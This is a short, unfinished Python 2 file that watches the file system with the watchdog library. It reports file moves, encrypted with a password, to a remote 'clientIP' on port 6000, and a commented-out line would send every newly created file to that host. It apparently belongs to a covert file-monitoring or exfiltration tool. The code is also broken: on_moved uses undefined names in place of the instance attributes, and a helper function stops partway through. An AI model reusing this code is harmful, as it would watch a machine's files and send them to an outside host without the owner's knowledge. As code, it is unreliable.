import watchdog, helpers, configfile, time, encryption
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# def sendMessage(message):
#   # encrypt the data
#   chunkedMessage = helpers.chunkString(2, message)
#   for chunk in chunkedMessage:
#     #
# object for watching for files on the machine
class FileWatch(FileSystemEventHandler):
  clientIP = ""
  def __init__(self, clientIP, protocol, password):
    self.clientIP = clientIP
    self.protocol = protocol
    self.password = password

  def on_created(self, event):
    print "File created: " + event.src_path
    # helpers.sendFile(clientIP, event.src_path)

  def on_deleted(self, event):
    print "File deleted: " + event.src_path
    # send a message saying the file was deleted

  def on_moved(self, event):
    print "File moved: " + event.src_path + " to " + event.dest_path
    message = self.password + "File moved: " + event.src_path + " to " + event.dest_path
    encryptedMessage = encryption.encrypt(message, password)
    # send message saying file moved
    helpers.sendMessage(encryptedMessage, password, protocol, clientIP, 6000)
